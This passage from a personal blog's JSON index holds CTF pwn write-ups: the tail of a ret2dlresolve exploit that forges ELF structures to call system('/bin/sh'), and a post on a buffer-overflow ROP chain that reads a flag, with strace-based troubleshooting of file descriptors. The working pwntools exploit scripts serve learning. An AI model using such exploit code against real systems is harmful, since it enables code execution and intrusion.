\u0026#34;dt_jmprel\u0026#34;]) print(f\u0026#34;[*] strtab (.dynstr) at: {hex(strtab)}\u0026#34;) print(f\u0026#34;[*] symtab (.dynsym) at: {hex(symtab)}\u0026#34;) print(f\u0026#34;[*] jmprel (.rel.plt) at: {hex(jmprel)}\u0026#34;) def align(addr): return (0x18 - (addr) % 0x18) # payload 1 ============================= # 1. overflow into return address # 2. call read(0, .bss, size_of_fake_entries) # 3. return to vuln() \u0026#34;\u0026#34;\u0026#34; this function takes an arbitrary number of arbitrarily nested lists, tuples and dictionaries. it will then find every string and number inside those and flatten them out. strings are inserted directly while numbers are packed using the :func:`pack` function. unicode strings are utf-8 encoded. examples \u0026gt;\u0026gt;\u0026gt; flat(4) b\u0026#39;\\x04\\x00\\x00\\x00\u0026#39; \u0026gt;\u0026gt;\u0026gt; flat(b\u0026#39;x\u0026#39;) b\u0026#39;x\u0026#39; \u0026gt;\u0026gt;\u0026gt; flat([1,2,3]) b\u0026#39;\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00\u0026#39; \u0026gt;\u0026gt;\u0026gt; flat({4:b\u0026#39;x\u0026#39;}) b\u0026#39;aaaax\u0026#39; \u0026#34;\u0026#34;\u0026#34; payload_1 = pwn.flat({ 72: [ # pad 72 bytes to overwrite buffer and rbp values pwn.p64(rop.rdi.address), pwn.p64(0), # read from stdin pwn.p64(rop.rsi.address), pwn.p64(bss), # read into .bss section pwn.p64(0), # junk for pop r15 # we do not have gadget to set rdx to size of next payload stage, but it has value 0xc8 when next instruction is called, we can work with that our as next stage is much smaller than 0xc8 (200) bytes elf.sym.read, # call read() elf.symbols[\u0026#34;vuln\u0026#34;], # return to vuln() after read() ] }) proc.sendline(payload_1) # payload 2 ============================ # 1. input value into previous read(0, .bss, size) call # a. create fake elf64_rel structure (.rel.plt) # b. create fake elf64_sym structure (.dynsym) # c. write string \u0026#39;system\u0026#39; for .dynstr resolution of symbol name # d. write string \u0026#39;/bin/sh\u0026#39; for passing as argument to system later # 2. let return to vuln() as proposed in payload 1 \u0026#34;\u0026#34;\u0026#34; typedef struct { elf64_addr r_offset; /* 64 bit - address */ elf64_xword r_info; /* 64 bit - relocation type and symbol index */ elf64_sxword r_addend; /* 64 bit - addend */ } elf64_rela; // 24 bytes \u0026#34;\u0026#34;\u0026#34; # fake elf64_sym is at 24 bytes (size of fake elf64_rela - jmprel entry) after bss. index must be offset from symtab base. #dynsym_idx = ((bss + 24) - symtab) // 24 \u0026lt;-- this resulted in an index in fraction, we need to align the address to 24 byte structures. padding = align(bss - symtab) fake_structs = bss + padding dynsym_idx = ((fake_structs + 24) - symtab) // 24 r_info = (dynsym_idx \u0026lt;\u0026lt; 32) | 0x7 # fake elf64_sym entry must contain offset to symbol name from strtab. dynstr_off = (fake_structs + 48) - strtab payload_2 = pwn.flat({ 0: [ # fake elf64_rela entry for jmprel bss, # r_offset - a write address to write address of system after resolution r_info, # r_info - indexes into our fake .dynsym entry pwn.p64(0), # r_addend - zero, not needed for our purposes b\u0026#39;\\x00\u0026#39; * padding, # added padding to make 24 byte (structure size) alignment as dynsym_idx (in r_info) must be exact multiple of 24 @ss pwn.p32(dynstr_off), # st_name - offset from strtab for our symbol name pwn.p32(0) * 5, # other 20 bytes, not needed for our purposes # target symbol name to be referenced from strtab through our symtab entry \u0026#34;system\\x00\\x00\u0026#34;, # argument to system \u0026#34;/bin/sh\\x00\u0026#34;, ] }) payload_2 = payload_2 + b\u0026#39;a\u0026#39; * (200 - len(payload_2)) # proc.sendline() was buggy so i filled entire 200 byte limit in count of read() proc.send(payload_2) # payload 3 ============================ # 1. overflow into the return address # 2. push reloc_arg (that resolves to start of our fake structure region) # 3. return to plt default stub # 4. profit binsh_addr = fake_structs + 24 + 24 + 8 # start of fake structs + size of elf64_rela + size of elf64_sym + length of \u0026#39;system\\x00\\x00\u0026#39; reloc_arg = (fake_structs - jmprel) // 24 payload_3 = pwn.flat({ 72: [ pwn.p64(rop.rdi.address), # setup argument for system() pwn.p64(binsh_addr), plt_stub, # to call dl_resolve reloc_arg, # plt stub assumes that the offset to jmprel entry is already pushed ] }) proc.send(payload_3) proc.interactive() post exploitation post-exploitation i drated a meme that looked cool to me and adhered to then meme trends.\n","title":"How are functions resolved: A jump across tables into dl_resolve"},{"date":"2024-10-05","image":"","imageAlt":"","link":"https://ashtrace.github.io/posts/tracing_file_descriptors/","summary":"I was going through an easy (as per the challenge platform, not personal ranking) pwn challenge. After successfully pwning the binary locally, I ran my exploit against the remote challenge service and failed. Referring to the writeup document I found this:\nThere was no explanation regarding the value of file-descriptor. Thus I went on a quest to trace for the value.","tags":["ctf","linux","pwn","writeup"],"text":"i was going through an easy (as per the challenge platform, not personal ranking) pwn challenge. after successfully pwning the binary locally, i ran my exploit against the remote challenge service and failed. referring to the writeup document i found this:\nthere was no explanation regarding the value of file-descriptor. thus i went on a quest to trace for the value.\nps: please bear with me while we fight togther to tally all those numbers :) (i tried my best to redact challenge name)\ncontext information we are provided with challenge elf binary named challengebinary, and a dockerfile to create docker container with binary and fake flag.\nexecutable mitigation information arch: amd64-64-little relro: full relro stack: no canary found nx: nx enabled pie: no pie (0x400000) stripped: no source code analysis (decompilation) main()\nint __cdecl main(int argc, const char **argv, const char **envp) { char s1[8]; // [rsp+0h] [rbp-40h] byref __int64 v5; // [rsp+8h] [rbp-38h] int v6; // [rsp+10h] [rbp-30h] __int64 buf[2]; // [rsp+20h] [rbp-20h] byref int fd; // [rsp+34h] [rbp-ch] unsigned __int64 i; // [rsp+38h] [rbp-8h] banner(argc, argv, envp); buf[0] = 0ll; buf[1] = 0ll; fd = open(\u0026#34;/dev/urandom\u0026#34;, 0); read(fd, buf, 8ull); printf(\u0026#34;\\n[strange man in mask screams some nonsense]: %s\\n\\n\u0026#34;, (const char *)buf); close(fd); *(_qword *)s1 = 0ll; v5 = 0ll; v6 = 0; printf(\u0026#34;[strange man in mask]: in order to proceed, tell us the secret phrase: \u0026#34;); __isoc99_scanf(\u0026#34;%16s\u0026#34;, s1); for ( i = 0ll; i \u0026lt;= 0xe; ++i ) { if ( s1[i] == 10 ) { s1[i] = 0; break; } } if ( !strncmp(s1, \u0026#34;s34s0nf1n4l3b00\u0026#34;, 0xfull) ) challenge_function(); else printf(\u0026#34;%s\\n[strange man in mask]: sorry, you are not allowed to enter here!\\n\\n\u0026#34;, \u0026#34;\\x1b[1;31m\u0026#34;); return 0; } the program opens up /dev/random at provides the user with 8 bytes of randomness it asks for a secret phrase (compared with s34s0nf1n4l3b00), if the phrase matches it calls challenge_function() challenge_function()\nssize_t challenge_function() { char buf[64]; // [rsp+0h] [rbp-40h] byref printf(\u0026#34;\\n[strange man in mask]: season finale is here! take this souvenir with you for good luck: [%p]\u0026#34;, buf); printf(\u0026#34;\\n\\n[strange man in mask]: now, tell us a wish for next year: \u0026#34;); fflush(stdin); fflush(_bss_start); read(0, buf, 0x1000ull); return write(1, \u0026#34;\\n[strange man in mask]: that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;, 0x54ull); } it discloses a stack address (of input buffer). it reads 4096 bytes into a 64 byte array. vulnerability as nx is enabled, but it is a no pie binary, we can possibly rop. we also have stack address leak to store data in our ropchain.\nexploitation exploit development we do not have a pop rdi ; ret gadget, but the moment challenge_function() returns, rdx stores 0x54 which would suffice for us, if flag is larger in size we would have to read it in 84 byte chunks, not an issue :).\nthe call to open() sets rdx to 0, so we return back to challenge_function() and send a second ropchain to read the flag from opened file.\nimport pwn pwn.context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] exe = \u0026#34;./challengebinary\u0026#34; elf = pwn.context.binary = pwn.elf(exe) proc = pwn.process(exe) proc.sendline(b\u0026#34;s34s0nf1n4l3b00\u0026#34;) # secret phrase proc.readuntil(b\u0026#34;[strange man in mask]: season finale is here! take this souvenir with you for good luck: [\u0026#34;) buffer_address = int(proc.readuntil(b\u0026#39;]\u0026#39;).decode()[:-1], 16) pwn.log.info(f\u0026#34;buffer\u0026#39;s stack address provided: {hex(buffer_address)}\u0026#34;) # gadgets ===================================================================== pop_rdi = 0x00000000004011f2 pop_rsi = 0x00000000004011f4 open_plt = 0x4010e0 read_plt = 0x401090 write_plt = 0x401050 padding = 64 + 8 # buffer size + rbp size ropchain_stage1 = pwn.flat({ 0: [ b\u0026#34;flag.txt\\0\u0026#34;, b\u0026#39;a\u0026#39; * (padding - len(b\u0026#34;flag.txt\\0\u0026#34;)), pwn.p64(pop_rdi), pwn.p64(buffer_address), pwn.p64(pop_rsi), pwn.p64(0), pwn.p64(open_plt), # open(\u0026#34;flag.txt\u0026#34;, o_rdonly), file descriptor returned for \u0026#34;flag.txt\u0026#34; would be 3 if program closed all the files it had opened before this call pwn.p64(elf.symbols[\u0026#34;finale\u0026#34;]) ] }) # call to open() sets rdx to 0 proc.sendline(ropchain_stage1) proc.readrepeat(1) ropchain_stage2 = pwn.flat({ padding: [ pwn.p64(pop_rdi), pwn.p64(3), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(read_plt), # read(3, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it pwn.p64(pop_rdi), pwn.p64(1), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(write_plt), # write(stdout, buffer, 84) ] }) proc.sendline(ropchain_stage2) proc.readuntil(b\u0026#34;that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;); pwn.log.info(f\u0026#34;flag: {proc.readline().decode()}\u0026#34; the script worked locally, but failed on remote instance.\ntroubleshooting i made slight change to the dockerfile to install strace and use it to trace my calls\nfrom ubuntu:20.04 env debian_frontend noninteractive run apt-get update --fix-missing \u0026amp;\u0026amp; apt-get -y upgrade run apt-get install -y socat strace run useradd -m ctf copy challenge/* /home/ctf/ run chown -r ctf:ctf /home/ctf/ workdir /home/ctf user ctf expose 9001/tcp entrypoint [\u0026#34;strace\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;socat\u0026#34;, \u0026#34;tcp-listen:9001,fork\u0026#34;, \u0026#34;exec:\u0026#39;./challengebinary\u0026#39;\u0026#34;] when i ran my exploit against the docker container, i observed that contrary to my assumption of fd being 3, when flag.txt was opened it was assigned 5 fd number.\n~$ docker run -it -p 9001:9001 --rm --name=challengebinary challenge | grep open openat(at_fdcwd, \u0026#34;/etc/ld.so.cache\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libwrap.so.0\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libutil.so.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libssl.so.1.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libcrypto.so.1.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libnsl.so.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libpthread.so.0\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34;, o_rdonly|o_cloexec) = 3 [pid 11] openat(at_fdcwd, \u0026#34;/etc/ld.so.cache\u0026#34;, o_rdonly|o_cloexec) = 5 [pid 11] openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;, o_rdonly|o_cloexec) = 5 [pid 11] openat(at_fdcwd, \u0026#34;/dev/urandom\u0026#34;, o_rdonly \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... openat resumed\u0026gt;) = 5 [pid 11] openat(at_fdcwd, \u0026#34;flag.txt\u0026#34;, o_rdonly \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... openat resumed\u0026gt;) = 5 updating the exploit script, it worked for remote instance\nfinal exploit script import pwn pwn.context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] exe = \u0026#34;./challengebinary\u0026#34; elf = pwn.context.binary = pwn.elf(exe) proc = pwn.remote(\u0026#34;83.136.251.168\u0026#34;, 39139) proc.sendline(b\u0026#34;s34s0nf1n4l3b00\u0026#34;) # secret phrase proc.readuntil(b\u0026#34;[strange man in mask]: season finale is here! take this souvenir with you for good luck: [\u0026#34;) buffer_address = int(proc.readuntil(b\u0026#39;]\u0026#39;).decode()[:-1], 16) pwn.log.info(f\u0026#34;buffer\u0026#39;s stack address provided: {hex(buffer_address)}\u0026#34;) # gadgets ===================================================================== pop_rdi = 0x00000000004011f2 pop_rsi = 0x00000000004011f4 open_plt = 0x4010e0 read_plt = 0x401090 write_plt = 0x401050 padding = 64 + 8 # buffer size + rbp size ropchain_stage1 = pwn.flat({ 0: [ b\u0026#34;flag.txt\\0\u0026#34;, b\u0026#39;a\u0026#39; * (padding - len(b\u0026#34;flag.txt\\0\u0026#34;)), pwn.p64(pop_rdi), pwn.p64(buffer_address), pwn.p64(pop_rsi), pwn.p64(0), pwn.p64(open_plt), # open(\u0026#34;flag.txt\u0026#34;, o_rdonly), file descriptor returned for \u0026#34;flag.txt\u0026#34; 5 (found from troubleshooting) pwn.p64(elf.symbols[\u0026#34;finale\u0026#34;]) ] }) # call to open() sets rdx to 0 with open(\u0026#34;exploit\u0026#34;, \u0026#34;wb+\u0026#34;) as f: f.write(b\u0026#34;s34s0nf1n4l3b00\\n\u0026#34;) f.write(ropchain_stage1) proc.sendline(ropchain_stage1) proc.readrepeat(1) ropchain_stage2 = pwn.flat({ padding: [ pwn.p64(pop_rdi), pwn.p64(5), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(read_plt), # read(5, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it pwn.p64(pop_rdi), pwn.p64(1), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(write_plt), # write(stdout, buffer, 84) ] }) proc.sendline(ropchain_stage2) proc.readuntil(b\u0026#34;that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;); pwn.log.info(f\u0026#34;flag: {proc.readline().decode()}\u0026#34;) digging deeper why did open() return 5?\nupon reading through strace logs, i found that socat registered 3, 4 for socketpair (socketpair are 2 file descriptors used for inter-process communication, they are bi-directional in nature. usually before forking a process creates a pair and then parent and child use one fd from the pair for read/write while close the other), while 5 was used for socket connection, and the newly created conenction was assigned 6.\nsocketpair(af_unix, sock_dgram, 0, [3, 4]) = 0 ... socket(af_inet, sock_stream, ipproto_tcp) = 5 bind(5, {sa_family=af_inet, sin_port=htons(9001), sin_addr=inet_addr(\u0026#34;0.0.0.0\u0026#34;)}, 16) = 0 getsockname(5, {sa_family=af_inet, sin_port=htons(9001), sin_addr=inet_addr(\u0026#34;0.0.0.0\u0026#34;)}, [16]) = 0 listen(5, 5) ... accept(5, {sa_family=af_inet, sin_port=htons(42340), sin_addr=inet_addr(\u0026#34;172.17.0.1\u0026#34;)}, [16]) = 6 once i run my exploit, 2 new processes are created pid 9, 10\npid 9 closed the socket connection and was out of the picture.\n[pid 9] close(6) = 0 meanwhile, pid 10 (returned by the original clone() call), closed 3, 4 and re-registered the socketpair. it further registered a new socket pair 5, 7 after closing the socket 5. but this one kept fd 6 pointing to current connection. next, it **clone()**s again to create pid 11. finally it closes 7, thus it would be using 5 for communication\nclone(child_stack=null, flags=clone_child_cleartid|clone_child_settid|sigchld, child_tidptr=0x7f06e36fda10) = 10 [pid 10] close(4 \u0026lt;unfinished ...\u0026gt; [pid 10] \u0026lt;... close resumed\u0026gt;) = 0 [pid 10] close(3) = 0 [pid 10] socketpair(af_unix, sock_dgram, 0, [3, 4]) = 0 ... [pid 10] close(5) = 0 [pid 10] socketpair(af_unix, sock_stream, 0, [5, 7]) = 0 ... [pid 10] clone(child_stack=null, flags=clone_child_cleartid|clone_child_settid|sigchldstrace: process 11 attached \u0026lt;unfinished ...\u0026gt; ... [pid 10] close(7) and finally, pid 11 closed 3, 4, 5 (socketpairs created by pid 10). re-creates two socketpairs 3-4. duplicated 7 as stdin and stdout and closed 7. finally pid 11 loads finale binary into memory.\n[pid 11] close(4 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 [pid 11] close(3 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 ... [pid 11] socketpair(af_unix, sock_dgram, 0 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... socketpair resumed\u0026gt;, [3, 4]) = 0 ... [pid 11] close(5 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 ... [pid 11] dup2(7, 0 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... dup2 resumed\u0026gt;) = 0 [pid 11] dup2(7, 1 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... dup2 resumed\u0026gt;) = 1 [pid 11] close(7) = 0 [pid 11] execve(\u0026#34;./challengebinary\u0026#34;, [\u0026#34;./challengebinary\u0026#34;], 0x5603cdb74e40 /* 12 vars */ \u0026lt;unfinished ...\u0026gt; when finale was loaded, it had following file descriptors\n0 - pointing to socketpair to communicate with pid 10 1 - pointing to socketpair to communicate with pid 10 2 - stderr 3 - pointing to socketpair it (pid 11) created 4 - pointing to socketpair it (pid 11) created 5 - free thus, 5 was allocated to all subsequent **open()**s\n","title":"Tracing file descriptors: A battle against poor writeups"}]
}

